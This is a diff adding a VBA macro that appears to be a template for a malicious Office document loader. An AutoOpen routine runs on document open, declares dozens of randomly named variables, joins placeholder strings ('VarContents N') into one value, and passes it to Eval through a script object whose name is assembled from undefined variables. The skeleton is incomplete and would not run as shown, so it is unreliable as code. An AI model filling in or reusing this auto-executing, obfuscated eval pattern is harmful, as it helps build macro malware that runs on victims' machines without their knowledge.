@@ -1,0 +1,116 @@
+Sub AutoOpen()
+Dim EHZlUr
+Dim NbgTHVZ
+Dim udBnGG
+Dim TwrobO
+Dim yAAErpH
+Dim lpzZGQr
+Dim qGRjzS
+Dim iuzVHuL
+Dim OaekjeX
+Dim fGcSMMX
+Dim EGhqcFO
+Dim qgkQunH
+Dim yKvzKx
+Dim ZenVczY
+Dim UsTwQPS
+Dim jPewYcF
+Dim ujqHpc
+Dim DAXzuJD
+Dim qpMSOn
+Dim eXKIFtT
+Dim ojfBgHq
+Dim QTKOHEw
+Dim XWUATem
+Dim FZhhQW
+Dim vFDjWGy
+Dim oyGrxww
+Dim NOPMdbR
+Dim DuCoRk
+Dim qWPNpZE
+Dim leNdXnc
+Dim dYXffhQ
+
+
+Dim eWmgfrF
+Dim fgTQvp
+Dim BdmZJwL
+Dim SsqFacg
+Dim wFJGYw
+Dim dvloZs
+Dim mTxqcNU
+Dim BDpmlF
+Dim cWJMIBb
+Dim CiiSSh
+Dim XIiYONE
+Dim pyaNKib
+Dim nFsENGL
+Dim yeiaNBc
+Dim ecZoWwm
+Dim EAAYTsc
+Dim CYMVKlT
+Dim dxzseH
+
+
+EHZlUr = " "
+NbgTHVZ = "VarContents 1"
+udBnGG = "VarContents 2"
+TwrobO = "VarContents 3"
+yAAErpH = "VarContents 4"
+lpzZGQr = "VarContents 5"
+qGRjzS = "VarContents 6"
+iuzVHuL = "VarContents 7"
+OaekjeX = "VarContents 8"
+fGcSMMX = "VarContents 9"
+EGhqcFO = "VarContents 10"
+qgkQunH = "VarContents 12"
+yKvzKx = "VarContents 13"
+ZenVczY = "VarContents 14"
+UsTwQPS = "VarContents 15"
+jPewYcF = "VarContents 16"
+ujqHpc = "VarContents 17"
+DAXzuJD = "VarContents 18"
+qpMSOn = "VarContents 19"
+eXKIFtT = "VarContents 20"
+ojfBgHq = "VarContents 21"
+QTKOHEw = "VarContents 22"
+XWUATem = "VarContents 23"
+FZhhQW = "VarContents 24"
+vFDjWGy = "VarContents 25"
+oyGrxww = "VarContents 26"
+NOPMdbR = "VarContents 27"
+DuCoRk = "VarContents 28"
+qWPNpZE = "VarContents 29"
+leNdXnc = "VarContents 30"
+dYXffhQ = "VarContents 31"
+eWmgfrF = "VarContents 32"
+fgTQvp = "VarContents 33"
+BdmZJwL = "VarContents 34"
+SsqFacg = "VarContents 35"
+wFJGYw = "VarContents 36"
+dvloZs = "VarContents 37"
+mTxqcNU = "VarContents 38"
+BDpmlF = "VarContents 39"
+cWJMIBb = "VarContents 40"
+CiiSSh = "VarContents 41"
+XIiYONE = "VarContents 42"
+pyaNKib = "VarContents 43"
+nFsENGL = "VarContents 44"
+yeiaNBc = "VarContents 45"
+ecZoWwm = "VarContents 46"
+EAAYTsc = "VarContents 47"
+CYMVKlT = "VarContents 48"
+dxzseH = "VarContents 49"
+
+
+
+EHZlUr = EHZlUr & BdmZJwL & SsqFacg & wFJGYw & dvloZs
+EHZlUr = EHZlUr & vFDjWGy & oyGrxww & NOPMdbR & DuCoRk
+EHZlUr = EHZlUr & mTxqcNU & BDpmlF & cWJMIBb & CiiSSh
+EHZlUr = EHZlUr & XIiYONE & pyaNKib & nFsENGL & dxzseH
+EHZlUr = EHZlUr & yeiaNBc & ecZoWwm & EAAYTsc & CYMVKlT
+Set oScript = CreateObject(jQczYq & lIiZVX & eqpkeh & iMIcJcw & RaVcdr & rWBuvsp & GuHSWpO & lYffzpi & OZPqTo & CBltav)
+oScript.Language = WKcHiN & aIgbJcN & PmfCAYl
+oScript.Eval (EHZlUr)
+End Sub
+
